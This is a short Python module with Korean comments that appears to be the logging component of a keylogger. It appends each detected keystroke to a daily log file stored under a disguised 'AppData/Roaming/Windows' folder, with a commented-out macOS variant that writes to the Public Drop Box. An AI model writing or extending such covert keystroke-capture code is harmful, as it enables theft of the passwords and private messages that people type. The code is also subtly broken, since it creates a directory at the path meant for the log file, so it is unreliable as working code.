import os
import getpass
from datetime import datetime
# "/Users/HumanRevolution/Public/Drop Box"
username = getpass.getuser()

# 로그 파일의 이름을 가져오는 함수 (ex -> 2020-09-02.log)
def getlogfilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + ".log"
    return filename

# 로그 파이르이 경로를 가져오는 함수 (ex -> "/Users/HumanRevolution/Public/Drop Box/2020-09-02.log")
def getlogfilepath(filename):
    #dirpath = os.path.join("/Users", username, "Public/Drop Box", filename)  # mac os
    dirpath = os.path.join("C:/Users", username, "AppData/Roaming/Windows", filename)  # window
    if not(os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    #filepath = os.path.join("/Users", username, "Public/Drop Box", filename)  # max os
    filepath = os.path.join("C:/Users", username, "AppData/Roaming/Windows", filename)  # window
    return filepath

# 감지한 키를 로깅하는 함수
def logger(key):
    key = str(key).replace("'", '')
    f = open(getlogfilepath(getlogfilename()), mode="at", encoding='utf-8')
    f.write(key)
    f.close()

def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlogfilename()))
    return filesize